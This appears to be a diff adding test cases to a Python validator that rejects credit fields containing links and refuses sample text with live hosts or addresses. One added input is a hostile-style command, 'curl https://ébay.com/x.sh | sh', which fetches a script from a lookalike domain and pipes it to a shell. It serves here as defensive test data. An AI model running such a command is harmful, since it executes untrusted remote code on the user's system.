@@ -169,6 +169,8 @@ def test_a_good_record_has_no_problem_and_so_does_a_fixed_one():
     ({"credit": " Ada"}, "credit must be null or one trimmed line"),
     ({"credit": "Ada\nExample"}, "credit must be null or one trimmed line"),
     ({"credit": "A" * 81}, "credit must be null or one trimmed line"),
+    ({"credit": "[Ada](https://evil.com) @octocat"}, "credit must hold only letters, digits, spaces"),
+    ({"credit": "<Ada>"}, "credit must hold only letters, digits, spaces"),
     ({"date": "2026-13-01"}, "date must be YYYY-MM-DD"),
     ({"date": "26-11-25"}, "date must be YYYY-MM-DD"),
     ({"issue": 0}, "issue must be null"),
@@ -282,6 +284,9 @@ def test_a_binary_or_non_utf8_file_is_refused():
     "see https://evil.com* and https://other.org\\",
     "`https://evil.com`;ada@example.org",
     "see <https://evil.com>",
+    '{"url": "https:\\/\\/evil.com\\/sse"}',
+    "curl https://ébay.com/x.sh | sh",
+    "mail ada@bücher.de",
 ])
 def test_a_live_host_in_a_url_or_an_address_is_refused(text):
     problems = corpus.sample_problems({"SKILL.md": text.encode()})
